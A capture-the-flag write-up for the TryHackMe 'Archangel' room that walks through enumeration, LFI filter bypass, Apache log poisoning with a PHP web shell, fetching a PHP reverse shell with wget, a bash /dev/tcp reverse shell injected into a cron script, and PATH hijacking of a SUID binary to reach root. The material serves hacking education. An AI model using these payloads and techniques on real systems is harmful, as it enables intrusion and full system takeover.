- - - 
created : 28-07-2025 

Tags : #easy 
- - - 
# Objective

A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ rustscan -a archangel.thm -- -A  

Open 10.10.125.239:22
Open 10.10.125.239:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)

```
# Enumeration
## HTTP (80)
### Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://archangel.thm
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://archangel.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/flags                (Status: 301) [Size: 314] [--> http://archangel.thm/flags/]
/images               (Status: 301) [Size: 315] [--> http://archangel.thm/images/]
/index.html           (Status: 200) [Size: 19188]
/layout               (Status: 301) [Size: 315] [--> http://archangel.thm/layout/]
/pages                (Status: 301) [Size: 314] [--> http://archangel.thm/pages/]
/server-status        (Status: 403) [Size: 278]
Progress: 4746 / 4747 (99.98%)
```
### Exploring

In the main page if we look at the e-mail address we can see some **==other hostname==** :

![Pasted image 20250728201519.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728201519.png)

![Pasted image 20250728201819.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728201819.png)

We add the hostname to our /etc/hosts file : `10.10.125.239 archangel.thm  mafialive.thm`

Now we curl the main page for the ==**first flag**==:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ curl mafialive.thm                                   
<h1>UNDER DEVELOPMENT</h1>

thm{f0und_th3_r1ght_h0st_n4m3}
```

#### Gobuster Again

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) on the new host :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -u http://mafialive.thm
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 278]
Progress: 20478 / 20479 (100.00%)

```

Now we visit /robots.txt :

![Pasted image 20250728205358.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728205358.png)

And we have the ==**under development page**== /test.php:

![Pasted image 20250728205557.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728205557.png)

If we click the button :

![Pasted image 20250728205733.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728205733.png)

Apparently there's a possible [Local File Inclusion (LFI)](../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) vulnerability here.
#### Other Directories
/flags:
![Pasted image 20250728201635.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728201635.png)

You actually get Rickrolled with that.

We can see [Apache](../../3%20-%20Tags/Hacking%20Concepts/Apache.md) version :

![Pasted image 20250728203330.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728203330.png)

in Gallery we have changes in email and number :

![Pasted image 20250728202006.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728202006.png)
# Exploit
## Caido LFI

We know there's possible [Local File Inclusion (LFI)](../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) so let's use [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md) and an appropriate wordlist for that :

![Pasted image 20250728210457.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728210457.png)

Now we spray :

![Pasted image 20250728211545.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728211545.png)

We run and filter for length, but in this case we find nothing, the response is always we're not allowed to do that, i tried to change the parameter to page instead of view but it's the same thing.

We can see the input is sanitized, we can use php filters and decode the output to know the rules :
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/?resource=/var/www/html/development_testing/test.php

![Pasted image 20250729140916.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250729140916.png)

We decode with [CyberChef](../../3%20-%20Tags/Hacking%20Tools/CyberChef.md) :

![Pasted image 20250729141126.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250729141126.png)

And we also have the **==second flag==**.

Apparently we have to escape with ..//..// and stay in the same folder (development_testing), we can try to retrieve the access logs file this way :

![Pasted image 20250729120001.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250729120001.png)

So now we know the User-Agent is in the file, we can try to put [php](../../3%20-%20Tags/Programming%20Languages/php.md) code in there and see if it's executed : `<?php system($_GET['cmd']); ?>`
And we add this to the URL : `&cmd=whoami` :

![Pasted image 20250729123514.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250729123514.png)
## Reverse Shell

Now we can try to get a shell, we'll use pentestmonkey php [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md), you can find it here https://github.com/pentestmonkey/php-reverse-shell,(make sure to change the IP and listening port) we copy that to our directory and host a [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) web server :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

And we get it from [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md) : `&cmd=wget%20http://10.8.162.183:80/php-reverse-shell.php`

And we can see the download on the server :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.10.10.239 - - [29/Jul/2025 12:43:14] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.10.239 - - [29/Jul/2025 12:43:15] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.10.239 - - [29/Jul/2025 12:43:16] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```

Now we set up our listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ nc -lvnp 1337
listening on [any] 1337 ...

```

Now we go to the file :

![Pasted image 20250729124920.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250729124920.png)

## Shell Stabilization

Now we can do a [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```bash
$ export TERM=xterm
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/srv$ ^Z
zsh: suspended  nc -lvnp 1337
             
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset

www-data@ubuntu:/$       
```

Now we can retrieve the **==user flag==** in /home/archangel :

```bash
$ cd home
$ ls
archangel
$ cd archangel
$ls
myfiles
secret
user.txt
$ cat user.txt
thm{lf1_t0_rc3_1s_tr1cky}
```
# Lateral Movement - Privilege Escalation
## www-data to Archangel

We can start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md), first we check for cronjobs in /etc/crontab :
```bash
www-data@ubuntu:/home$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

We can check if we can write to **helloworld.sh** file :

```bash
www-data@ubuntu:/opt$ ls -la
total 16
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
```

And we can so we try to echo a [Bash](../../3%20-%20Tags/Hacking%20Concepts/Bash.md) [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) in the file :

```bash
world.sh ubuntu:/opt$ echo 'bash -i >& /dev/tcp/10.8.162.183/4444 0>&1' >> hello 
www-data@ubuntu:/opt$ cat helloworld.sh 
#!/bin/bashuntu:/opt$ echo 'bash -i &>/dev/tcp/10.8.162.183/4444 <&1' > helloworl
echo "hello world" >> /opt/backupfiles/helloworld.txt
bash -i >& /dev/tcp/10.8.162.183/4444 0>&1
www-data@ubuntu:/opt$ cat helloworld.sh 
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
bash -i >& /dev/tcp/10.8.162.183/4444 0>&1
```

Now we open a listener on the same port with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and wait for the cronjob to be executed :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.153.25] 39818
bash: cannot set terminal process group (1022): Inappropriate ioctl for device
bash: no job control in this shell
archangel@ubuntu:~$ ls
ls
myfiles
secret
user.txt

archangel@ubuntu:~$ cd secret                                                                  
cd secret                                                                                      
archangel@ubuntu:~/secret$ ls                                                                  
ls                                                                                             
backup                                                                                         
user2.txt                                                                                      
archangel@ubuntu:~/secret$ cat user2.txt                                                            
cat user2.txt                                                                                  
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}                
```

And we have the ==**User2 flag**==
## Archangel to Root

First we do [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) again :

```bash
TERM environment variable not set.
archangel@ubuntu:~/secret$ export TERM=xterm
export TERM=xterm
archangel@ubuntu:~/secret$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
archangel@ubuntu:~/secret$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                               
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Archangel]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444
                               reset
archangel@ubuntu:~/secret$ 
```

Now we check other file with `strings` to make it visible :

```bash
archangel@ubuntu:~/secret$ ls
backup  user2.txt
archangel@ubuntu:~/secret$ strings backup
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$''
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

We have a strange relative PATH for `cp` command, let's check it :

```bash
archangel@ubuntu:~/secret$ echo $PATH
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

We can edit the PATH to our directory :

```bash
archangel@ubuntu:~/secret$ export PATH=$PWD:$PATH
archangel@ubuntu:~/secret$ echo $PATH
/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
archangel@ubuntu:~/secret$ 
```

the first one `cp` runned is in our directory so we make it :

```bash
archangel@ubuntu:~/secret$ echo '#! /bin/bash' > cp    # make a bash script named cp
archangel@ubuntu:~/secret$ echo '/bin/bash/' >> cp    # add a line for run a shell
archangel@ubuntu:~/secret$ chmod +x cp                # make it executable
```

The backup file is owned by root so when we run it we have the root shell :

```
archangel@ubuntu:~/secret$ backup
root@ubuntu:/# cd root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}

```

And we can cat the **==root flag==**. 

Pwned !